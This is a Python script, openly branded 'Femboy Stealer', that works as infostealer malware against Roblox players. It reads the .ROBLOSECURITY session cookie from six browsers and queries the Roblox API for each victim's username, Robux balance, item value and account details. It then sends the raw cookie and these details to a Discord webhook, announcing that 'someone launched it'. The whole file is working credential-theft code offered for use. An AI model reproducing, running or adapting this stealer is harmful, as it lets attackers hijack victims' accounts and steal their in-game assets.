

import browser_cookie3
import requests
import json
import robloxpy

url = "webhookURL"

# List of supported browsers
browsers = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'chromium']

# Iterate over all the supported browsers
cookiee = []

for browser_name in browsers:
    try:
        if browser_name == 'chrome':
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            print('20%')
        elif browser_name == 'firefox':
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            print('40%')

        elif browser_name == 'edge':
            cookies = browser_cookie3.edge(domain_name='roblox.com')
            print('60%')

        elif browser_name == 'opera':
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            print('80%')
        elif browser_name == 'brave':
            cookies = browser_cookie3.brave(domain_name='roblox.com')
        elif browser_name == 'chromium':
            cookies = browser_cookie3.chromium(domain_name='roblox.com')
        else:
            raise ValueError(f"Unsupported browser: {browser_name}")
        
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                roblox_cookie = cookie.value
                info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie}).text)
                rid = info["UserID"]
                rap = robloxpy.User.External.GetRAP(rid)
                friends = robloxpy.User.Friends.External.GetCount(rid)
                age = robloxpy.User.External.GetAge(rid)
                crdate = robloxpy.User.External.CreationDate(rid)
                rolimons = f"https://www.rolimons.com/player/{rid}"
                roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
                headshot = robloxpy.User.External.GetHeadshot(rid)
                username = info['UserName']
                robux = info['RobuxBalance']
                premium = info['IsPremium']
                cookiee.append(f":desktop: **{browser_name.title()}** Cookie\n:joystick: Username: {username}\n:id: User ID: {rid}\n:moneybag: RAP: {rap}\n:couple: Friends: {friends}\n:calendar: Age: {age} day old\n:calendar_spiral: Creation Date: {crdate}\n:chart_with_upwards_trend: Rolimons: {rolimons}\n:link: Roblox Profile: {roblox_profile}\n:money_with_wings: Robux Balance: {robux}\n:gem: Premium: {premium}\n*Cookie Value*:\n `{cookie.value}`\n")

        if not cookiee:
            cookiee.append(f"{browser_name} - nothing found\n") # added \n
                        
    except Exception as e:
        continue
        

data = {
    "username": "Femboy Stealer",
    "content": "@everyone someone launched it",
    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
    "embeds": [
        {
            "title": "🍪 ROBLOSECURITY Cookies Collected",
            "description": "Here are the cookies collected by Femboy Stealer:\n" + "\n\n".join(cookiee),
            "color": 0xffb6c1,
            "thumbnail": {
                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
            },
            "footer": {
                "text": "Femboy Stealer | https://github.com/TheCuteOwl",
                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
            }
        }
    ]
}



result = requests.post(url, json=data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print('')
